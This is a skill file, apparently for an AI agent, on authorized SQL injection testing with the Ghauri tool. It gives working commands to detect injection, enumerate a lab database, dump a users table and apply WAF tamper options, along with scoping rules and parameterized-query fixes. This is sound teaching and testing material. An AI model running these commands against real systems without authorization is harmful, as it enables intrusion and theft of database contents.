---
name: ghauri-sqli-lab
description: >
  Authorized SQL injection testing with Ghauri in labs/CTFs/owned apps: install,
  target scoping, detection vs exploitation flags, DBMS fingerprinting, safe
  dump practices, and evidence capture. Use only with written authorization —
  never against third-party production systems without permission.
---

# Ghauri SQLi Lab

## Scope And Authorization

- **In scope:** Deliberately vulnerable labs, CTFs, and applications you own or have
  **written authorization** to test.
- **Out of scope:** Unauthorized testing, data theft, destructive queries on shared prod
  without explicit rules of engagement.
- Prefer detection-only first; escalate to data extraction only if ROE allows.
- Redact connection strings, real PII, and production credentials from notes.
- Pair with `sqli-sql-injection` / `injection-checking` for methodology; this skill is
  **Ghauri-focused** tooling.

## When To Use

- Automating SQLi confirmation after manual hypothesis on a lab target.
- Comparing Ghauri vs sqlmap on the same authorized endpoint.
- Extracting schema/tables only within lab ROE.
- Teaching controlled exploitation workflow with evidence.

## Do Not Use As Primary

| Need | Skill instead |
| --- | --- |
| Unknown injection class triage | `injection-checking` |
| Deep SQLi methodology / fix guidance | `sqli-sql-injection` |
| XSS / SSTI / command injection | respective injection skills |
| Production WAF tuning only | WAF skills |
| Secure coding remediation | `code-quality-standards` + secure query patterns |

## Concepts

| Item | Notes |
| --- | --- |
| Ghauri | Python SQLi detection/exploitation tool (sqlmap-like UX) |
| Technique | boolean-blind, time-blind, error-based, UNION, stacked (DBMS-dependent) |
| Level/risk | Aggressiveness knobs — raise carefully even in labs |
| Tamper | Payload encoding for WAF labs |
| DBMS | MySQL, PostgreSQL, MSSQL, Oracle, etc. fingerprint |
| Dump | Table data extraction — highest sensitivity |

## Workflow

### 1. Confirm authorization and ROE

1. Record target URL, owner, lab name, allowed techniques, data handling rules.
2. Success: confirmed SQLi with technique listed; optional dump of **lab-only** tables;
   remediation notes for developer.
3. If production-like shared env: ban `DROP`/destructive stacked queries.

### 2. Install and sanity-check

```bash
# Prefer venv
python -m venv .venv
# Windows: .venv\Scripts\activate
source .venv/bin/activate
pip install ghauri

ghauri --help
ghauri --version
```

Pin versions in lab writeups for reproducibility.

### 3. Manual baseline first

1. Identify parameter (`?id=`, JSON field, header, cookie).
2. Manual probes: `'` , `"`, boolean true/false, time delays if allowed.
3. Capture request in Burp/ZAP; save raw request file for Ghauri `-r`.

```http
GET /item?id=1 HTTP/1.1
Host: lab.example.local
```

### 4. Detection with Ghauri

```bash
# URL mode
ghauri -u "http://lab.example.local/item?id=1" --batch

# From request file (auth cookies, POST body)
ghauri -r req.txt --batch

# Specify parameter
ghauri -u "http://lab.example.local/item?id=1" -p id --batch

# Force technique subset (example: boolean + error)
ghauri -u "http://lab.example.local/item?id=1" --technique=BE --batch
```

Record: injectable parameter, technique, DBMS guess, payload sample (redacted).

### 5. Fingerprint and enumerate (if ROE allows)

```bash
ghauri -u "http://lab.example.local/item?id=1" --current-db --banner --batch
ghauri -u "http://lab.example.local/item?id=1" --dbs --batch
ghauri -u "http://lab.example.local/item?id=1" -D labdb --tables --batch
ghauri -u "http://lab.example.local/item?id=1" -D labdb -T users --columns --batch
```

Stop at schema if ROE is detection-only.

### 6. Controlled data extraction

```bash
# Dump single table only when authorized
ghauri -u "http://lab.example.local/item?id=1" \
  -D labdb -T users -C id,username --dump --batch
```

Rules:

- Prefer non-sensitive columns in demos.
- Store dumps in encrypted lab folder; delete after writeup.
- Never pivot to real user PII outside lab datasets.

### 7. WAF / encoding labs

```bash
# Tamper scripts if provided by tool version
ghauri -u "http://lab.example.local/item?id=1" --tamper=between --batch
```

Document bypass only for authorized WAF testing; include fix guidance (parameterized
queries), not “how to stay undetected” for criminal use.

### 8. Evidence and remediation handoff

Writeup sections:

1. Target and ROE
2. Request/response proof (screenshots or sanitized HTTP)
3. Tool command (copy-paste reproducible)
4. Impact (auth bypass, data read)
5. Fix: parameterized queries / ORM bind parameters, least-privilege DB user,
   disable detailed SQL errors, WAF as defense-in-depth only

```sql
-- Good: parameterized
SELECT * FROM item WHERE id = ?;
-- Bad: string concat
-- SELECT * FROM item WHERE id = '" + user + "'";
```

## Command quick reference

| Goal | Flags (typical) |
| --- | --- |
| Batch defaults | `--batch` |
| Request file | `-r req.txt` |
| Param | `-p name` |
| Threads | `--threads N` (lab only; avoid DoS) |
| Proxy | `--proxy http://127.0.0.1:8080` |
| Timeout | `--timeout` |
| DBMS hint | `--dbms=mysql` |

Exact flags may vary by Ghauri version — `ghauri -h` is authoritative.

## Good / Bad

| Topic | Good | Bad |
| --- | --- | --- |
| Scope | Lab + written ROE | Random Internet hosts |
| Order | Manual then tool | Blind mass `--dump` |
| Impact | Minimal columns | Full PII dump “for fun” |
| Safety | Low threads, no destructive SQL | Stacked `DROP DATABASE` |
| Report | Fix with prepared statements | Only payload list |

## Output Checklist

- [ ] Authorization/ROE recorded
- [ ] Manual reproduction notes
- [ ] Ghauri detection command + result
- [ ] DBMS/technique documented
- [ ] Enumeration limited to ROE
- [ ] Dump (if any) secured and minimized
- [ ] Remediation guidance included
- [ ] Secrets/PII redacted from report
- [ ] Tool version pinned

## Rules

- Authorized targets only — no exceptions for “open to the Internet.”
- Prefer detection-first; dump only when allowed.
- Do not provide guidance intended to attack systems without permission.
- Parameterized queries are the primary fix.
- Route non-SQLi findings to other skills.
